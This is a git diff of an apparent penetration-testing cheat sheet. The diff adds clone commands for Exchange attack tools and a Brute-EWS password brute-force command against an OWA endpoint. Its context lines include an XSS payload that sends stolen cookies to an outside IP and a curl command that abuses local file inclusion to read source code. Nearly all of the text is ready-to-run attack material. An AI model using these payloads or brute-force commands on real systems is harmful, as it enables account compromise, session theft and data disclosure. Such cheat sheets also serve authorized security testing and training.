@@ -3,7 +3,9 @@
 ## Tools needed:
 Enum4linux:  `git clone -v https://github.com/portcullislabs/enum4linux /opt/enum4linux-git`\
 Nullinux:    `git clone -v https://github.com/m8r0wn/nullinux /opt/nullinux-git`\
-Install UserEnum_LDAP: `git clone -v https://github.com/sensepost/UserEnum /opt/UserEnum_LDAP`
+Install UserEnum_LDAP: `git clone -v https://github.com/sensepost/UserEnum /opt/UserEnum_LDAP`\
+OWA Toolkit EWS Brute: `git clone -v https://github.com/johnnyDEP/OWA-Toolkit /opt/OWA-Toolkit`\
+MailSniper: `git clone -v https://github.com/dafthack/MailSniper /opt/MailSniper`
 
 ## Linux commands:
 
@@ -262,7 +264,8 @@ XSS steal cookies: `<script>new image().src="http://192.168.0.1/submission.php?s
 LFI/RFI Enumeration: `https://github.com/kurobeats/fimap`\
 LFI/PHP filter: `curl -s http://vulnerale-page/?page=php://filter/convert.base64-encode/resource=index | base64 -d`\
 PHPinfo exploit: `https://github.com/kurobeats/fimap/wiki/FimapPhpInfoExploit`\
-LFI: `http://www.insomniasec.com/publications/LFI%20With%20PHPInfo%20Assistance.pdf`
+LFI: `http://www.insomniasec.com/publications/LFI%20With%20PHPInfo%20Assistance.pdf`\
+Exchange tools: `Brute-EWS -TargetList .\userids.txt -ExchangeVersion 2007_SP1  -ewsPath "https://owa.domain.com/EWS/Exchange.asmx" -Password "omg123" -Domain "domain.com" `
 
 ### SQL TCP/1433:
 
